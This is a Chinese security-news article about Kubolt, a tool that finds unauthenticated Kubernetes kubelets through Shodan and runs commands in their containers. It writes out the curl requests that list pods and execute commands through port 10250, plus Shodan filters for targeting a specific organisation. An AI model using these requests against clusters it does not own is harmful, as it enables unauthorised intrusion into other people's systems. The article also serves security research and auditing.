**今天给大家介绍的是一款名叫Kubolt的实用工具，广大研究人员可以使用Kubolt轻松对公共Kubernetes集群执行安全扫描任务。**

![a.png](https://image.3001.net/images/20190702/1562079119_5d1b6f8f0985f.png!small)

Kubolt是一款可以用来对公共未认证的Kubernetes集群进行安全扫描的实用工具，它允许我们直接在容器内运行控制命令。

某些情况下，Kubelet端口10250是开放的并接受未认证的访问请求，这样我们就可以使用[kubelet](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go)的getrun函数来在容器内部执行操作命令了：

    
    
    //getRun handles requests to run a command inside a container.
    
    func(s *Server) getRun(request *restful.Request, response *restful.Response) {
    
           params := getExecRequestParams(request)
    
           pod, ok := s.host.GetPodByName(params.podNamespace,params.podName)
    
           if !ok {
    
            response.WriteError(http.StatusNotFound,fmt.Errorf("pod does not exist"))
    
                  return
    
           }

## 运行机制及使用方式

基础请求示例：

    
    
    ssl:trueport:10250 404

Kubelet默认使用SSL以及端口10250，其中的404指的是使用没有URL路径的HTTP响应。

Kubolt会通过Shodan API来请求获取一份IP地址列表，并保存下来以供后续公开资源情报调查活动的使用。

首先，我们可以运行Kubelet并过滤掉请求中不包含Unauthorized但包含container的主机，然后直接在容器内运行命令：

    
    
    curl -k https://IP-from-Shodan:10250/runningpods/

当然了，你还可以利用下列请求获取所有可用的Pods：

    
    
    curl-k https://IP-from-Shodan:10250/pods/

或

    
    
    curlhttp://IP-from-Shodan:10255/pods/

接下来，Kubolt会对主机返回的响应信息进行解析，并生成如下所示的新请求：

    
    
    curl -XPOST -khttps://IP-from-Shodan:10250/run/<namespace>/<PodName>/<containerName>-d "cmd=<command-to-run>"

你还可以使用如下Shodan过滤器来针对企业组织网络进行更加精准的安全扫描：

> -asn
>
> -org
>
> -country
>
> -net

### 工具安装

    
    
    mkdir output
    
    pip install -r requirements.txt

### 工具运行

    
    
    python kubolt.py --query "asn:123123 org:'ACME Corporation'"

或

    
    
    pythonkubolt.py --query "org:'ACME Corporation' country:UK"

Shodan

Kubolt使用了Shodan API以及相应的Query
Credits，如果你在没有配置请求过滤器的情况下运行了该工具，那你有可能会触发你所有的Credits。

## 项目地址

Kubolt：【[GitHub传送门](https://github.com/averonesis/kubolt)】

 ***
参考来源：[averonesis](https://github.com/averonesis/kubolt)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

